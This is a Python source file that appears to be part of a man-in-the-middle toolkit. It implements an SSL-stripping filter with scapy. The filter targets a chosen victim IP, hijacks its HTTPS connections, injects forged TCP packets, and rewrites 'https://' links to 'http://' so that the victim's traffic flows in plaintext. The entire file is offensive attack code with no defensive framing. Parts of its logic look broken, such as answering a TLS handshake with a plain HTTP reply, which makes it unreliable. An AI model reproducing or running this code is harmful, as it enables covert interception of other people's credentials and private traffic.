import socket
import ssl
from scapy.layers.http import HTTPRequest, HTTPResponse
from scapy.layers.inet import IP, TCP

class SSLStripFilter:
    """
    A packet-level SSL stripping filter.
    Intercepts victim HTTPS requests, downgrades them to HTTP,
    talks HTTPS to the server, sends HTTP back to the victim.
    """

    def __init__(self, victim_ip, logger):
        self.victim_ip = victim_ip
        self.logger = logger
        self.active_connections = {}  
    
    def __call__(self, packet):
        # Only handle TCP packets
        if not packet.haslayer(TCP):
            return False

        ip = packet[IP]
        tcp = packet[TCP]

        # Only intercept traffic going OUT from the victim to a server
        if ip.src != self.victim_ip:
            return False

        # Is this the first HTTPS Client packet?
        if tcp.dport == 443 and len(tcp.payload) > 0:
            return self._handle_initial_tls(packet)

        # If HTTPS connection is established, this port is stripped
        if tcp.sport in self.active_connections:
            return self._forward_https_response(packet)

        return False


    # HTTPS to HTTP "downgrade"
    def _handle_initial_tls(self, packet):
        ip = packet[IP]
        tcp = packet[TCP]

        victim_port = tcp.sport
        server_ip = ip.dst

        self.logger(f"[SSLStripping] Intercepting TLS from victim:{victim_port} → {server_ip}")

        # Create HTTPS socket to the server
        try:
            ctx = ssl.create_default_context()
            tls_sock = ctx.wrap_socket(
                socket.create_connection((server_ip, 443)),
                server_hostname=server_ip
            )
            self.active_connections[victim_port] = tls_sock

        except Exception as e:
            self.logger(f"[SSLStripping] TLS connection to {server_ip} failed: {e}")
            return False

        # Send HTTP 200 OK + banner to start plaintext
        self._send_http_redirect(packet)

        return True


    def _send_http_redirect(self, packet):
        ip = packet[IP]
        tcp = packet[TCP]

        http = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Connection: keep-alive\r\n\r\n"
            "<html><body></body></html>"
        )

        forged = (
            IP(src=ip.dst, dst=ip.src) /
            TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.ack, ack=tcp.seq+1, flags="PA") /
            http
        )
        try:
            import scapy.all as sc
            sc.send(forged, verbose=0)
        except Exception as e:
            self.logger(f"[SSLStripping] Failed to send forged HTTP banner: {e}")


    # Forward HTTPS responses through plaintext to victim

    def _forward_https_response(self, packet):
        ip = packet[IP]
        tcp = packet[TCP]
        victim_port = tcp.sport
        server_sock = self.active_connections.get(victim_port)

        if server_sock is None:
            return False

        try:
            server_sock.send(bytes(tcp.payload))
            data = server_sock.recv(8192)
        except Exception as e:
            self.logger(f"[SSLStripping] Server socket error: {e}")
            return True

        if len(data) == 0:
            return True

        # Rewrite HTTPS to HTTP inside server response
        data = data.replace(b"https://", b"http://")

        forged = (
            IP(src=ip.dst, dst=ip.src) /
            TCP(
                sport=tcp.dport,
                dport=tcp.sport,
                seq=tcp.ack,
                ack=tcp.seq + len(tcp.payload),
                flags="PA"
            ) /
            data
        )

        try:
            import scapy.all as sc
            sc.send(forged, verbose=0)
        except:
            pass

        # Packet is handled — do not forward normally
        return True